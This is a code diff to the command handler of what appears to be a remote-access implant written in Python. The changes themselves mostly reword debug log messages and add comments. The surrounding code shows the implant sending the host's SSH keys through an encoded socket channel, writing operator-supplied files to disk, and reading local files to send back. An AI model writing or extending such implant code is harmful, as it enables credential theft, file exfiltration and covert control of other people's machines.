@@ -44,7 +44,8 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                     self.request.sendall(self.cipher.encode(self.platform.get_ssh_keys()))
                 elif cmd.startswith('upload') == True:
                     saveMeFile = cmd[7:].split(' ')[1]
-                    self.logger.debug("uploading file")
+                    self.logger.debug("receiving file")
+                    
                     if os.path.isfile(saveMeFile):
                         break 
                     else:  
@@ -52,18 +53,21 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                             self.logger.debug("reading file")
                             while True: 
                                 data = self.cipher.decode(self.request.recv(BUFFER_SIZE))
-                                     
-                                if not data:
+                                                                
+                                if not data: #error... receiving NULL instead of EOF_STR
                                     break
                                 elif EOF_STR in data: 
+                                    self.logger.debug("read EOF msg from wire")
                                     f.write(data[:-8])
                                     break
                                 else:
+                                    self.logger.debug("writing data to file")
                                     f.write(data)
-                        self.logger.debug("saved file")    
+                        self.logger.debug("saved file")            
                 elif cmd.startswith('download') == True:
                     sendMeFile = cmd[9:].split(' ')[0]
-                    self.logger.debug("starting download")
+                    self.logger.debug("starting upload")
+                    
                     with open(sendMeFile, 'rb') as f:
                         self.logger.debug("reading file")
                         while True:
